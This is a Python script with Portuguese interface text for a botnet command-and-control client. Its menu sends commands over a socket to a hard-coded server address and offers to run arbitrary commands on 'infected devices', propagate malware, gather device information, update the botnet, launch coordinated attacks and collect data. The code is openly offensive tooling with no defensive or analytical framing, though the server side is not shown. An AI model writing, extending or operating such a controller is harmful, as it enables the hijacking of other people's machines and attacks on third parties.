import socket
import sys
import logging

SERVER_ADDRESS = ('192.168.1.43', 9273)

def send_command(command):
    try:
        with socket.create_connection(SERVER_ADDRESS, timeout=10) as s:
            s.sendall(command.encode())
            response = s.recv(1024).decode()
            return response
    except socket.error as e:
        logging.error(f"Erro de conexão com o servidor: {e}")
        return None
    except Exception as e:
        logging.error(f"Erro: {e}")
        return None

def execute_command():
    logging.info("Opção selecionada: Executar comandos nos dispositivos infectados")
    command = input("Digite o comando a ser enviado para os dispositivos infectados: ")
    response = send_command(command)
    if response:
        print("Resposta do servidor:", response)

def propagate_malware():
    logging.info("Opção selecionada: Propagar malware")
    response = send_command("propagar_malware")
    if response:
        print("Resposta do servidor:", response)

def get_device_info():
    logging.info("Opção selecionada: Obter informações do dispositivo")
    response = send_command("obter_informacoes")
    if response:
        print("Resposta do servidor:", response)

def update_botnet():
    logging.info("Opção selecionada: Atualizar e controlar a botnet")
    response = send_command("atualizar_botnet")
    if response:
        print("Resposta do servidor:", response)

def coordinated_attacks():
    logging.info("Opção selecionada: Ataques coordenados")
    response = send_command("ataques_coordenados")
    if response:
        print("Resposta do servidor:", response)

def monitor_data():
    logging.info("Opção selecionada: Monitoramento e coleta de dados")
    response = send_command("monitoramento_dados")
    if response:
        print("Resposta do servidor:", response)

def show_greeting():
    print("Bem-vindo ao Cliente C&C!")

def show_menu():
    print("\nOpções:")
    print("1. Executar comandos nos dispositivos infectados")
    print("2. Propagar malware")
    print("3. Obter informações do dispositivo")
    print("4. Atualizar e controlar a botnet")
    print("5. Ataques coordenados")
    print("6. Monitoramento e coleta de dados")
    print("0. Sair")

def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    logging.info("Bem-vindo ao Cliente C&C!")
    try:
        while True:
            show_menu()
            option = input("Escolha uma opção: ")
            if option == '1':
                execute_command()
            elif option == '2':
                propagate_malware()
            elif option == '3':
                get_device_info()
            elif option == '4':
                update_botnet()
            elif option == '5':
                coordinated_attacks()
            elif option == '6':
                monitor_data()
            elif option == '0':
                print("Saindo...")
                break
            else:
                print("Opção inválida. Por favor, escolha uma opção válida.")
    except KeyboardInterrupt:
        logging.info("Programa encerrado pelo usuário.")
        sys.exit(0)

if __name__ == "__main__":
    main()
    
